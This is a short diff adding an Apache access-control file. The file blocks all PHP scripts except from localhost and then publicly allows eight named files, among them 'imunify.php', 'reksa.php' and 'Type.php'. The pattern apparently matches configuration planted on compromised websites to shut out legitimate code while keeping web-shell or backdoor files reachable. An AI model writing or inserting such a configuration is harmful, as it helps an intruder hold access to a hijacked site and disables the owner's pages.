@@ -1,0 +1,8 @@
+<FilesMatch "\.php$">
+Require all denied
+Require ip 127.0.0.1
+</FilesMatch>
+
+<FilesMatch "^(search\.php|admin\.php|store\.php|403\.php|imunify\.php|reksa\.php|module\.php|Type\.php)$">
+Require all granted
+</FilesMatch>
